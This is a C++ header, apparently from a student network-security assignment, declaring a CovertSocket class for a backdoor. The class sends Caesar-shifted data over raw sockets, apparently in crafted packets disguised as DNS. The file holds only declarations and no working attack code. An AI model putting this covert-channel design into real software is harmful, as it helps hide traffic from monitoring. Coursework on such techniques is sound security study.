//
// Created by bensoer on 18/10/16.
//

#ifndef INC_8505_A3_BACKDOOR_COVERTSOCKET_H
#define INC_8505_A3_BACKDOOR_COVERTSOCKET_H

#include <string>

using namespace std;

class CovertSocket {

private:
    CovertSocket();

    static CovertSocket * instance;

    int rawSocket;

    string sourceAddress = "127.0.0.1";
    string destinationAddress = "127.0.0.1";

    int caesarOffset = -1;

    void ChangetoDnsNameFormat(char* dns, char* host);

public:

    void setCaesarOffset(int offset);

    static CovertSocket * getInstance();

    void send(string data);

    unsigned short csum(unsigned short *ptr, int nbytes);

    void setSourceAddress(string sourceAddress);
    void setDestinationAddress(string destinationAddress);

};


#endif //INC_8505_A3_BACKDOOR_COVERTSOCKET_H
